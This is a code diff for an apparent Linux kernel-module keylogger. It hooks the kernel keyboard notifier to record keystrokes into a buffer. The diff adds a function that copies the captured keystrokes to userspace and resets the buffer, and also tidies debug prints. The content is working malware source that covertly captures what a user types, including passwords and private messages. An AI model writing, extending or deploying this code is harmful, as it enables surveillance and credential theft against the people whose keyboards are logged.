@@ -234,7 +234,7 @@ static void ksym_mod(struct keyboard_notifier_param *ks, char *buf)
  * inserted into the string to indicate the NEW capslock state (e for enabled,
  * d for disabled).
  */
-static void ksym_cap (struct keyboard_notifier_param *ks, char *buf)
+static void ksym_cap(struct keyboard_notifier_param *ks, char *buf)
 {
 	int len;
 	unsigned char val  = ks->value & 0x00ff;
@@ -324,10 +324,8 @@ keylogger_notifiy(struct notifier_block *nb, unsigned long kcode, void *p)
 {
 	struct keyboard_notifier_param *param = p;
 	
-	if (kcode == KBD_KEYSYM) {
+	if (kcode == KBD_KEYSYM)
 		xlate_keysym(param, trans);
-		pr_debug("%s: trans=%s\n", __func__, trans);
-	}
 
 	return NOTIFY_OK;
 }
@@ -336,14 +334,39 @@ static struct notifier_block keylogger_notifier_block = {
 	.notifier_call = &keylogger_notifiy,
 };
 
-int keylogger_init(void)
+/*
+ * keylogger_buffer_get: copy keylogger buffer to
+ * userspace buffer @dst of size @size
+ */
+int keylogger_buffer_get(char *dst, unsigned int size)
 {
-	if (!ksyms.register_keyboard_notifier) {
-		pr_debug("%s: register_keyboard_notifier not found\n");
+	int ret;
+
+	pr_debug("%s %p %u\n", __func__, dst, size);
+
+	if (size > BUFLEN)
+		size = BUFLEN;
+
+	ret = ksyms._copy_to_user(dst, trans, size);
+	if (ret) {
+		pr_debug("%s: copy_to_user failed\n", __func__);
 		return -1;
 	}
 
+	/* reset buffer */
+	trans[0] = 0;
 
+	return 0;
+}
+
+int keylogger_init(void)
+{
+	if (!ksyms.register_keyboard_notifier) {
+		pr_debug("%s: register_keyboard_notifier not found\n", __func__);
+		return -1;
+	}
+
+	memset(trans, 0, sizeof(trans));
 	ksyms.register_keyboard_notifier(&keylogger_notifier_block);
 
 	return 0;
@@ -352,7 +375,7 @@ int keylogger_init(void)
 int keylogger_exit(void)
 {
 	if (!ksyms.unregister_keyboard_notifier) {
-		pr_debug("%s: register_keyboard_notifier not found\n");
+		pr_debug("%s: register_keyboard_notifier not found\n", __func__);
 		return -1;
 	}
 
